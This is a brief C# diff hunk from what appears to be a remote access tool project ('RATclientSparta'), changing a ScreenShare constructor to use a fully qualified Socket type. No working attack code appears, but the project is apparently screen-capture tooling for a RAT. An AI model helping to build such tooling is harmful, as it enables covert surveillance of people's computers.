@@ -19,7 +19,7 @@ namespace RATclientSparta.Tools.ScreenShare
         private bool close = false;
         public Bitmap LastScreen;
         private Paint paint;
-        public ScreenShare(ServerData server, Socket socket)
+        public ScreenShare(ServerData server, System.Net.Sockets.Socket socket)
         {
             InitializeComponent();
             //Screen data (Small GUI is opening for cases that a fullscreened game is opened)
